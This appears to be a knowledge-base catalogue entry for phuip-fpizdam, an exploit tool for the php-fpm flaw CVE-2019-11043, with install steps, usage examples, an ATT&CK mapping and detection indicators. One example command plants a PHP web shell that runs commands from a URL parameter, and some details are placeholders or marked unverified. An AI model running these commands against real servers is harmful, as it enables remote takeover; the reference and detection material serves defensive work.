---
url: 'https://github.com/neex/phuip-fpizdam/'
tags:
  - exploit
  - rce
  - php-fpm
type: tool
platforms:
  - Linux
description: >-
  Exploit tool for CVE-2019-11043 to achieve RCE in vulnerable php-fpm via Nginx
  without socket access
id: e5a8cb0c-5d29-41af-8988-23c5042bd0dc
created_at: '2025-12-14T17:23:49.438Z'
updated_at: '2025-12-14T17:23:49.438Z'
verified: false
validated: true
submitted: true
---
# phuip-fpizdam

**Status**: Unverified

## Overview

phuip-fpizdam is a proof-of-concept exploit for CVE-2019-11043, targeting buffer underflow in php-fpm to enable remote code execution through standard HTTP requests to Nginx-proxied endpoints.

## Description

The tool sends crafted FastCGI requests that exploit the empty PATH_INFO condition, leading to memory corruption and arbitrary PHP code execution. It's written in C, supports HTTP/HTTPS, and includes a Dockerfile for vulnerable environment setup. Primary use: demonstrating RCE in web deployments using vulnerable PHP versions.

## Features

- Feature 1: Exploits via HTTP without php-fpm socket access
- Feature 2: Supports arbitrary PHP payloads for code execution
- Feature 3: Includes setup for testing environment with Docker

## Installation

### Requirements

- GCC compiler
- Git

### Install Commands

```bash
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
gcc phuip-fpizdam.c -o phuip-fpizdam
```

## Basic Usage

```bash
./phuip-fpizdam --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| URL | Target URL with trigger |
| Payload | PHP code to run |

## Examples

### Example 1: Basic Usage

```bash
./phuip-fpizdam "http://localhost/index.php/%0a" "php -r 'system(\"id\");'"
```

### Example 2: Advanced Usage

```bash
./phuip-fpizdam "https://target.com/script.php/%0a" "php -r 'file_put_contents(\"/tmp/shell.php\", \"<?php system(\\$_GET[\"cmd\"]); ?>\");'"
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network traffic with encoded %0a in paths to PHP endpoints
- Anomalous FastCGI requests in Nginx logs
- Unexpected PHP execution in php-fpm processes

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Related Tool 1]]
- [[Related Tool 2]]

## References

- Official documentation: https://github.com/neex/phuip-fpizdam/
- Related resources: CVE-2019-11043 advisory
